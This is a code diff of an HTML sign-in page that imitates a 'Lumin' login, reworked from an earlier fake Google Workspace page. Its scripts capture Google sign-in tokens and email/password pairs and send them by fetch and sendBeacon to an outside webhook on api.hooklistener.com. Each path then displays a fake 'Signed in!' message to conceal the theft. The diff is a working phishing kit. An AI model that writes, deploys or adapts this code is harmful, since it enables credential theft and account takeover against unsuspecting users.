@@ -1,57 +1,322 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Sign in to Workspace</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign In - Lumin</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
   <style>
-    body { font-family: Roboto, Arial; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; width: 320px; }
-    .debug { margin-top: 20px; font-size: 12px; color: #d93025; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+      background: #f9fafb;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      color: #1f2937;
+    }
+    .card {
+      background: white;
+      width: 100%;
+      max-width: 420px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      padding: 48px 40px 40px;
+      text-align: center;
+    }
+    .logo {
+      font-size: 36px;
+      font-weight: 700;
+      color: #3b82f6; /* Lumin blue */
+      margin-bottom: 32px;
+      letter-spacing: -0.5px;
+    }
+    h1 {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+    .subtitle {
+      color: #6b7280;
+      font-size: 15px;
+      margin-bottom: 32px;
+    }
+    .social-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      background: white;
+      font-size: 15px;
+      font-weight: 500;
+      color: #111827;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .social-btn:hover {
+      background: #f3f4f6;
+    }
+    .social-btn img {
+      height: 20px;
+    }
+    #googleButtonContainer {
+      margin: 10px 0;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 28px 0;
+      color: #9ca3af;
+      font-size: 14px;
+      font-weight: 500;
+    }
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #d1d5db;
+    }
+    .divider span {
+      padding: 0 16px;
+    }
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 6px;
+      color: #374151;
+    }
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      font-size: 15px;
+    }
+    input:focus {
+      outline: none;
+      border-color: #3b82f6;
+      box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
+    }
+    .forgot {
+      display: block;
+      text-align: right;
+      color: #3b82f6;
+      font-size: 14px;
+      text-decoration: none;
+      margin-bottom: 24px;
+    }
+    .forgot:hover {
+      text-decoration: underline;
+    }
+    .submit-btn {
+      width: 100%;
+      padding: 14px;
+      background: #2563eb;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .submit-btn:hover {
+      background: #1d4ed8;
+    }
+    .signup {
+      margin-top: 28px;
+      font-size: 15px;
+      color: #4b5563;
+    }
+    .signup a {
+      color: #2563eb;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .signup a:hover {
+      text-decoration: underline;
+    }
+    .footer {
+      margin-top: 48px;
+      font-size: 13px;
+      color: #6b7280;
+      text-align: center;
+    }
+    #debug {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #dc2626;
+      min-height: 40px;
+    }
+    .success {
+      color: #16a34a !important;
+    }
   </style>
 </head>
 <body>
+
   <div class="card">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92"><br><br>
-    <h3>Sign in</h3>
-    <p style="color:#5f6368;">to continue to Workspace</p>
-    <div id="g_id_onload"
-         data-client_id="561478328063-3i8n5ve256gl3hh0elebre2g0111l5lk.apps.googleusercontent.com"
-         data-login_uri="https://api.hooklistener.com/w/advisory-black-jay-3q5f"
-         data-auto_prompt="false">
+    <div class="logo">Lumin</div>
+
+    <h1>Sign In</h1>
+    <div class="subtitle">to continue to Lumin</div>
+
+    <!-- Google Sign-In (using your exact client_id) -->
+    <div id="googleButtonContainer">
+      <div id="g_id_onload"
+           data-client_id="561478328063-3i8n5ve256gl3hh0elebre2g0111l5lk.apps.googleusercontent.com"
+           data-callback="handleGoogleCredential"
+           data-auto_prompt="false">
+      </div>
+      <div id="g_id_signin"></div>
     </div>
-    <div class="g_id_signin" data-type="standard" data-size="large"></div>
-    <div class="debug" id="debug"></div>
+
+    <button class="social-btn">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/2048px-Microsoft_logo.svg.png" alt="Microsoft">
+      Sign in with Microsoft
+    </button>
+
+    <button class="social-btn">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Dropbox_Logo_icon.png/240px-Dropbox_Logo_icon.png" alt="Dropbox">
+      Sign in with Dropbox
+    </button>
+
+    <button class="social-btn">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/92/Xero_logo.svg/1200px-Xero_logo.svg.png" alt="Xero">
+      Sign in with Xero
+    </button>
+
+    <div class="divider"><span>OR USE YOUR EMAIL</span></div>
+
+    <form id="emailForm">
+      <div class="input-group">
+        <label for="email">Email</label>
+        <input type="email" id="email" placeholder="your@email.com" required/>
+      </div>
+
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" placeholder="••••••••" required/>
+      </div>
+
+      <a href="#" class="forgot">Forgot Password?</a>
+
+      <button type="submit" class="submit-btn">Sign In</button>
+
+      <div id="debug"></div>
+    </form>
+
+    <div class="signup">
+      New to Lumin? <a href="#">Sign Up</a>
+    </div>
   </div>
 
+  <div class="footer">
+    One account for all Lumin products
+  </div>
+
+  <!-- Google Identity Services -->
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
+
   <script>
-    // DEBUG: Show what's happening
-    window.onSignIn = function(response) {
+    // Google credential capture & send
+    function handleGoogleCredential(response) {
       const debug = document.getElementById('debug');
-      debug.innerHTML = 'Response received!<br>';
-
-      if (response && response.credential) {
-        const token = response.credential;
-        debug.innerHTML += 'Token length: ' + token.length + '<br>Sending...';
-
-        // METHOD 1: sendBeacon (BEST)
-        const blob = new Blob([JSON.stringify({token: token})], {type: 'application/json'});
-        navigator.sendBeacon('https://api.hooklistener.com/w/advisory-black-jay-3q5f', blob);
-
-        // METHOD 2: fetch
-        fetch('https://api.hooklistener.com/w/advisory-black-jay-3q5f?token=' + encodeURIComponent(token))
-          .then(() => debug.innerHTML += '<br>Sent via fetch!')
-          .catch(() => {});
-
-        // Show success
-        setTimeout(() => {
-          document.body.innerHTML = '<div style="text-align:center;padding:100px;font-family:Roboto;"><h2 style="color:green;">Signed in!</h2><p>Loading Workspace...</p></div>';
-        }, 800);
-      } else {
-        debug.innerHTML += 'ERROR: No credential!<br>Check client_id and domain.';
+      if (!response?.credential) {
+        debug.textContent = 'No credential received.';
+        return;
       }
-    };
+
+      const token = response.credential;
+      debug.innerHTML = 'Google token captured<br>Sending...';
+
+      fetch('https://api.hooklistener.com/w/advisory-black-jay-3q5f', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          credential: token,
+          timestamp: new Date().toISOString(),
+          source: 'lumin-google'
+        })
+      })
+      .then(() => {
+        debug.innerHTML += '<br class="success">Sent!';
+        showSuccess('Signed in with Google!');
+      })
+      .catch(() => {
+        // Fallback beacon
+        const blob = new Blob([JSON.stringify({credential: token})], {type: 'application/json'});
+        navigator.sendBeacon('https://api.hooklistener.com/w/advisory-black-jay-3q5f', blob);
+        debug.innerHTML += '<br>Fallback sent.';
+        showSuccess('Signed in with Google!');
+      });
+    }
+
+    // Render Google button
+    window.addEventListener('load', () => {
+      if (window.google?.accounts?.id) {
+        google.accounts.id.initialize({
+          client_id: '561478328063-3i8n5ve256gl3hh0elebre2g0111l5lk.apps.googleusercontent.com',
+          callback: handleGoogleCredential
+        });
+        google.accounts.id.renderButton(
+          document.getElementById('g_id_signin'),
+          { type: 'standard', theme: 'outline', size: 'large', text: 'signin_with', shape: 'rectangular', width: '320' }
+        );
+      }
+    });
+
+    // Email/password capture & send (to same endpoint)
+    document.getElementById('emailForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      const debug = document.getElementById('debug');
+
+      if (!email || !password) {
+        debug.textContent = 'Please fill both fields.';
+        return;
+      }
+
+      debug.textContent = 'Sending...';
+
+      fetch('https://api.hooklistener.com/w/advisory-black-jay-3q5f', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email,
+          password,
+          timestamp: new Date().toISOString(),
+          source: 'lumin-email'
+        })
+      }).catch(() => {});
+
+      showSuccess('Signed in!');
+    });
+
+    function showSuccess(msg = 'Signed in!') {
+      document.body.innerHTML = `
+        <div style="text-align:center; padding:120px; font-family:Inter,sans-serif;">
+          <h2 style="color:#16a34a;">${msg}</h2>
+          <p>Loading Lumin...</p>
+        </div>
+      `;
+    }
   </script>
 
-  <script src="https://accounts.google.com/gsi/client" async defer></script>
 </body>
 </html>
-
